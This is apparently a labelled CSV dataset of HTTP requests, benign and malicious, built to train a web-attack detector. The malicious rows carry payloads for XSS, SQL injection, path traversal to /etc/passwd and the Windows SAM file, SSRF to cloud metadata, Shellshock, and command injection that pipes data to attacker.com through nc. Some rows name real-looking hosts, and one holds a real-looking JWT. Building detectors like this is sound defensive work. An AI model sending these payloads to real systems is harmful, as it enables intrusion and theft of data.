method,path,query,headers,body,ua,label
GET,/login,,Authorization: Bearer token123,,,0
GET,/,,Content-Type: application/json; Payload: <img src=x onerror=alert(1)>,,,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/api/v1/projects,,Authorization: Bearer token123,,,0
GET,/admin/dashboard/users/active,,Content-Type: application/json,,,0
GET,/api/v1/tasks/rep_99/status,,Authorization: Bearer token123,,,0
GET,/CFIDE/administrator/enter.cfm,locale=../../../../../../../lib/password.properties%00en,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46",1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: <iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/login,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,Nmap Scripting Engine,1
GET,/api/v1/support/tickets/404/attachments,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.11 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.11 Safari/605.1.15",1
GET,/,,Content-Type: application/json; Payload: admin*)(| (password=*)),,,1
PUT,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
PUT,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: phar://path/to/malicious.phar/shell.php",,,1
GET,/admin,"q="" onmouseover=alert(1) """,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/api/v1/deliver/kindle,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/team/invite,,Content-Type: application/json,,,0
GET,/api/v1/dashboard/widgets/sales-chart/data,,Content-Type: application/json,,,0
GET,/,,"Authorization: Bearer token123; Payload: id=1 UNION SELECT null, user(), database()--",,,1
GET,/maps/v2/tile/10/512/324.png,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
PUT,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,curl/7.68.0,1
DELETE,/admin,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,curl/7.68.0,1
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user641&password=pass565,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"Authorization: Bearer token123; Payload: <iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/cas/logout,"url=https://oast.pro""><img%20src=x%20onerror=alert(document.domain)>","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525+ (KHTML, like Gecko) Version/3.1.1 Safari/525.17",,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525+ (KHTML, like Gecko) Version/3.1.1 Safari/525.17",1
DELETE,/index.php,,Host: example.com; Accept: */*,input=' OR 1=1--,Nikto/2.1.6,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--",,,1
GET,/api/v1/map/data,lat=21.0285&lng=105.8542&zoom=15,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"Content-Type: application/json; Payload: PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/robots.txt,,Authorization: Bearer token123,,,0
POST,/collect,v=1&tid=UA-XXXXX,Authorization: Bearer token123,,,0
POST,/products,id=123,Host: example.com; Accept: */*,username=user882&password=pass133,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,Content-Type: application/json; Payload: ; echo $USER | nc attacker.com 1234,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ..\..\..\..\windows\system32\config\sam",,,1
POST,/index.php,,Host: example.com; Accept: */*,input=&& whoami,Nmap Scripting Engine,1
PUT,/index.php,,Host: example.com; Accept: */*,input=' OR 'x'='x,sqlmap/1.5.2,1
POST,/user/password-update,,Content-Type: application/json,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=; ls -la,Nmap Scripting Engine,1
GET,/index.php,op=fileviewer&file=/etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.1517.2.1 Ddg/17.2.1",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.1517.2.1 Ddg/17.2.1",1
POST,/products,,Host: example.com; Accept: */*,username=user710&password=pass708,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/api/v1/sync/video,,Authorization: Bearer token123,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ..\..\..\..\windows\system32\config\sam",,,1
POST,/,,Content-Type: application/json,"{""$where"": ""function() { return this.name == 'admin' }""}",,1
DELETE,/admin,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,curl/7.68.0,1
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
PUT,/search,,Host: example.com; Accept: */*,input=&& whoami,sqlmap/1.5.2,1
POST,/auth/mfa/verify,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
DELETE,/index.php,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,curl/7.68.0,1
GET,/preview.php,controller=pjLoad&action=pjActionIndex&question_search=1&pjPage=1&column=created&direction=DESC&keyword=%22><script>alert(document.domain)</script>,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",1
POST,/team/invite,,Content-Type: application/json,,,0
POST,/home,,Host: example.com; Accept: */*,username=user270&password=pass159,Mozilla/5.0 (Linux; Android 11),0
GET,/api/v1/tasks/rep_99/status,,Authorization: Bearer token123,,,0
GET,/index.php,q=..\..\..\windows\system32,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,Content-Type: application/json; Payload: %253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ..\..\..\..\windows\system32\config\sam",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ..\..\..\..\windows\system32\config\sam",,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","{""$where"": ""this.user == 'admin'""}",,1
GET,/tagebuch/eintraege/index.html,"reloaded&page=1"">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",,"Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",1
GET,/favicon.ico,,,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: () { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/properties/,keyword_search=--!%3E%22%20autofocus%20onfocus%3Dalert(/39pwHQVG1sUztlSNPpQfPYSWO1k/)%3B%2F%2F,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: php://input",,,1
GET,/web-api/orders/954632c1-4f17-454a-969a-43c2ec46f93b,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzgwMjczODIiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiMTRjNjg0ZjktN2JiZC00Y2U4LWFkYTUtZjNjNzdkNGQ1NDVkIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzgwMjczODIiLCJzdWIiOiJXRUJTSVRFQDA3NzgwMjczODIiLCJpYXQiOjE3NzA2MzAyMTMsImV4cCI6MTc3MTIzNTAxM30.oKnxHifyTLOLt33ouLz9wFzunpoeoGI269AAkUy_ptM; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 1a494070-82ff-4fff-8952-cc321f353aaf",,python-requests/2.32.5,0
POST,/webhooks/github,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/favicon.ico,,,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/favicon.ico,,,,,0
PUT,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/wishlist/add,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/privacy/consent,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,username=user156&password=pass367,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/api/v1/sync/video,,Authorization: Bearer token123,,,0
GET,/,,Authorization: Bearer token123; Payload: Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,php://filter/convert.base64-encode/resource=index.php,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"Content-Type: application/json; Payload: id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
POST,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",{smart_f_shell_exec('id')},,1
PUT,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/podcasts/latest.xml,,Authorization: Bearer token123,,,0
GET,/login,q=| cat /etc/passwd,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,Content-Type: application/json; Payload: ac ed 00 05 73 72 00 12 ...,,,1
